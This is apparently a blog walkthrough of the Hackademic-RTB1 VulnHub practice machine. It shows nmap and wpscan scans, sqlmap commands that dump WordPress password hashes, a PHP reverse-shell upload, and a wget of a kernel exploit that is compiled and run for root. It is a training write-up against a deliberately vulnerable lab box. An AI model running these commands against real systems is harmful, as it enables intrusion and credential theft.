---
categories:
- vulnhub
- walkthrough
- hackademic
comments: false
date: "2012-11-13T01:24:24Z"
title: Solving Hackademic-RTB1
---

Hackademic is a pseudo-realistic boot2root box that aims for realism over puzzles or steganography (or obscurity like pwn0s2..).  With that, lets start:

The initial scan:

```
# Nmap 6.01 scan initiated Tue Nov 13 22:16:40 2012 as: nmap -sSV -F -T5 -oN hack.scan 192.168.1.168
Nmap scan report for 192.168.1.168
Host is up (0.00028s latency).
Not shown: 98 filtered ports
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
MAC Address: 08:00:27:3A:9D:2B (Cadmus Computer Systems)

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
# Nmap done at Tue Nov 13 22:16:48 2012 -- 1 IP address (1 host up) scanned in 7.87 seconds
```

A 'closed' responding ssh and an HTTP server.  Navigating to the site gives us a lovely Wordpress.  Running wpscan..

```
root@bt:/pentest/web/wpscan# ruby wpscan.rb --url http://192.168.1.168/Hackademic_RTB1/
____________________________________________________
 __          _______   _____                  
 \ \        / /  __ \ / ____|                 
  \ \  /\  / /| |__) | (___   ___  __ _ _ __  
   \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
    \  /\  /  | |     ____) | (__| (_| | | | |
     \/  \/   |_|    |_____/ \___|\__,_|_| |_| v2.0r7491288

    WordPress Security Scanner by the WPScan Team
 Sponsored by the RandomStorm Open Source Initiative
_____________________________________________________

| URL: http://192.168.1.168/Hackademic_RTB1/
| Started on Tue Nov 13 22:20:45 2012

[!] The WordPress 'http://192.168.1.168/Hackademic_RTB1/readme.html' file exists
[+] WordPress version 1.5.1.1 identified from meta generator

[!] We have identified 2 vulnerabilities from the version number :

 | * Title: WordPress <= 1.5.1.1 "add new admin" SQL Injection Exploit
 | * Reference: http://www.exploit-db.com/exploits/1059/

 | * Title: WordPress <= 1.5.1.1 SQL Injection Exploit 
 | * Reference: http://www.exploit-db.com/exploits/1033/

[+] Enumerating plugins from passive detection ... 
No plugins found :(

[+] Finished at Tue Nov 13 22:20:45 2012
[+] Elapsed time: 00:00:00
root@bt:/pentest/web/wpscan# 
```

Clearly a Wordpress, and quite clearly a very old version.  I couldn't get the listed add admin exploit to work, so I played around with SQLi:

{{< figure src="/images/posts/2012/hrt_1.jpg" >}}

The backend appears to be running as root.  Switching over to sqlmap, we can iterate through the backend much quicker:

```
root@bt:/pentest/database/sqlmap# python sqlmap.py --url http://192.168.1.168/Hackademic_RTB1/?cat=0 --users --passwords

[22:29:16] [INFO] resuming back-end DBMS 'mysql' 
[22:29:16] [INFO] testing connection to the target url
[22:29:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Fedora 13 (Goddard)
web application technology: PHP 5.3.3, Apache 2.2.15
back-end DBMS: MySQL 5.0
[22:29:16] [INFO] fetching database users
[22:29:16] [INFO] the SQL query used returns 27 entries
database management system users [1]:
[*] 'root'@'localhost'

[22:29:16] [INFO] fetching database users password hashes
[22:29:17] [INFO] the SQL query used returns 1 entries
[22:29:17] [INFO] resumed: root
[22:29:17] [INFO] resumed: 2eaec110380126d7
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] n
database management system users password hashes:
[*] root [1]:
    password hash: 2eaec110380126d7

[22:29:18] [INFO] fetched data logged to text files under '/pentest/database/sqlmap/output/192.168.1.168'

[*] shutting down at 22:29:18

root@bt:/pentest/database/sqlmap# 
```

There's the 'mysql' root hash, which appears to be an old style hash.  Moving forward...

```
root@bt:/pentest/database/sqlmap# python sqlmap.py --url http://192.168.1.168/Hackademic_RTB1/?cat=0 --current-db

[22:32:10] [INFO] resuming back-end DBMS 'mysql' 
[22:32:10] [INFO] testing connection to the target url
[22:32:10] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Fedora 13 (Goddard)
web application technology: PHP 5.3.3, Apache 2.2.15
back-end DBMS: MySQL 5.0
[22:32:10] [INFO] fetching current database
[22:32:10] [INFO] resumed: wordpress
current database:    'wordpress'

[*] shutting down at 22:32:10

root@bt:/pentest/database/sqlmap# python sqlmap.py --url http://192.168.1.168/Hackademic_RTB1/?cat=0 -D wordpress --tables

[22:33:47] [INFO] resuming back-end DBMS 'mysql' 
[22:33:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Fedora 13 (Goddard)
web application technology: PHP 5.3.3, Apache 2.2.15
back-end DBMS: MySQL 5.0
[22:33:48] [INFO] fetching tables for database: 'wordpress'
[22:33:48] [INFO] the SQL query used returns 9 entries
[22:33:48] [INFO] resumed: wp_categories
[22:33:48] [INFO] resumed: wp_comments
[22:33:48] [INFO] resumed: wp_linkcategories
[22:33:48] [INFO] resumed: wp_links
[22:33:48] [INFO] resumed: wp_options
[22:33:48] [INFO] resumed: wp_post2cat
[22:33:48] [INFO] resumed: wp_postmeta
[22:33:48] [INFO] resumed: wp_posts
[22:33:48] [INFO] resumed: wp_users
Database: wordpress
[9 tables]
+-------------------+
| wp_categories     |
| wp_comments       |
| wp_linkcategories |
| wp_links          |
| wp_options        |
| wp_post2cat       |
| wp_postmeta       |
| wp_posts          |
| wp_users          |
+-------------------+

[*] shutting down at 22:33:48

root@bt:/pentest/database/sqlmap# python sqlmap.py --url http://192.168.1.168/Hackademic_RTB1/?cat=0 -D wordpress -T wp_users --columns
[22:36:06] [INFO] resuming back-end DBMS 'mysql' 

[22:36:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Fedora 13 (Goddard)
web application technology: PHP 5.3.3, Apache 2.2.15
back-end DBMS: MySQL 5.0
[22:36:06] [INFO] fetching columns for table 'wp_users' in database 'wordpress'
[22:36:06] [WARNING] the SQL query provided does not return any output
[22:36:06] [INFO] the SQL query used returns 22 entries
Database: wordpress
Table: wp_users
[22 columns]
+---------------------+---------------------+
| Column              | Type                |
+---------------------+---------------------+
| ID                  | bigint(20) unsigned |
| user_activation_key | varchar(60)         |
| user_aim            | varchar(50)         |
| user_browser        | varchar(200)        |
| user_description    | longtext            |
| user_domain         | varchar(200)        |
| user_email          | varchar(100)        |
| user_firstname      | varchar(50)         |
| user_icq            | int(10) unsigned    |
| user_idmode         | varchar(20)         |
| user_ip             | varchar(15)         |
| user_lastname       | varchar(50)         |
| user_level          | int(2) unsigned     |
| user_login          | varchar(60)         |
| user_msn            | varchar(100)        |
| user_nicename       | varchar(50)         |
| user_nickname       | varchar(50)         |
| user_pass           | varchar(64)         |
| user_registered     | datetime            |
| user_status         | int(11)             |
| user_url            | varchar(100)        |
| user_yim            | varchar(50)         |
+---------------------+---------------------+

[*] shutting down at 22:36:06

root@bt:/pentest/database/sqlmap# python sqlmap.py --url http://192.168.1.168/Hackademic_RTB1/?cat=0 -D wordpress -T wp_users -C user_pass,user_login,user_level --dump

[*] starting at 22:38:47

[22:38:47] [INFO] resuming back-end DBMS 'mysql' 
[22:38:47] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Fedora 13 (Goddard)
web application technology: PHP 5.3.3, Apache 2.2.15
back-end DBMS: MySQL 5.0
[22:38:47] [INFO] fetching entries of column(s) 'user_level, user_login, user_pass' for table 'wp_users' in database 'wordpress'
[22:38:47] [INFO] the SQL query used returns 6 entries
Database: wordpress
Table: wp_users
[6 entries]
+----------------------------------+--------------+------------+
| user_pass                        | user_login   | user_level |
+----------------------------------+--------------+------------+
| 21232f297a57a5a743894a0e4a801fc3 | NickJames    | 1          |
| 50484c19f1afdaf3841a0d821ed393d2 | MaxBucky     | 0          |
| 7cbb3252ba6b7e9c422fac5334d22054 | GeorgeMiller | 10         |
| 8601f6e1028a8e8a966f6c33fcd9aec4 | JasonKonnors | 0          |
| a6e514f9486b83cb53d8d932f9a04292 | TonyBlack    | 0          |
| b986448f0bb9e5e124ca91d3d650f52c | JohnSmith    | 0          |
+----------------------------------+--------------+------------+

[*] shutting down at 22:38:50

root@bt:/pentest/database/sqlmap# 
```

The `user_level` determines their level of access on the Wordpress, with 1 being basic and 10 being administrator.  You can guess which account we went after:

{{< figure src="/images/posts/2012/hrt_2.jpg" >}}

Now we've got an administrative account on the Wordpress.  It's a very basic, very old, Wordpress.  How can we go about getting shell access?

{{< figure src="/images/posts/2012/hrt_3.jpg" >}}

By allowing file uploads, increasing the maximum size and adding to the allowable file extensions, we can upload the fantastic [PHP reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).  Then all we need to do is open up a netcat listener and navigate to the PHP file in wp-content/...

{{< figure src="/images/posts/2012/hrt_4.jpg" >}}

Now we've got a shell.  Some enumeration...

```
sh-4.0$ uname -a
uname -a
Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
sh-4.0$ netstat -vant
netstat -vant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address               Foreign Address             State      
tcp        0      0 0.0.0.0:3306                0.0.0.0:*                   LISTEN      
tcp        0      0 127.0.0.1:631               0.0.0.0:*                   LISTEN      
tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      
tcp        0      0 192.168.1.168:47372         192.168.1.232:1234          ESTABLISHED 
tcp        0      0 :::80                       :::*                        LISTEN      
tcp        0      0 ::1:631                     :::*                        LISTEN      
tcp        0      0 ::ffff:192.168.1.168:80     ::ffff:192.168.1.118:54299  ESTABLISHED 
sh-4.0$ whoami
whoami
apache
sh-4.0$ 
```

Odd that MySQL is listening on 0.0.0.0, but we couldn't find it on a scan.  Likely iptable rules in place, but we need root first.  How's about a kernel [privilege escalation vulnerability](http://downloads.securityfocus.com/vulnerabilities/exploits/44219.c)?

```
sh-4.0$ cd /tmp                     
cd /tmp
sh-4.0$ wget downloads.securityfocus.com/vulnerabilities/exploits/44219.c
wget downloads.securityfocus.com/vulnerabilities/exploits/44219.c
--2012-11-14 06:52:05--  http://downloads.securityfocus.com/vulnerabilities/exploits/44219.c
Resolving downloads.securityfocus.com... 143.127.139.111
Connecting to downloads.securityfocus.com|143.127.139.111|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6804 (6.6K) [text/plain]
Saving to: `44219.c'

     0K ......                                                100% 72.1K=0.09s

2012-11-14 06:52:05 (72.1 KB/s) - `44219.c' saved [6804/6804]

sh-4.0$ gcc 44219.c -o sploit
gcc 44219.c -o sploit
sh-4.0$ ./sploit
./sploit
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[*] Overwriting security ops...
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
whoami
root
cd /root/                                                                       
ls
Desktop
anaconda-ks.cfg
key.txt
key.txt~
cat key.txt
Yeah!!
You must be proud because you 've got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)

$_d&jgQ>>ak\#b"(Hx"o<la_%

Regards,
mr.pr0n || p0wnbox.Team || 2011
http://p0wnbox.com
```

And that's game!  Pretty nice box, though I must admit priv esc vulnerabilities in out of date kernels are rather boring.  Next up, Hackademic RTB2.
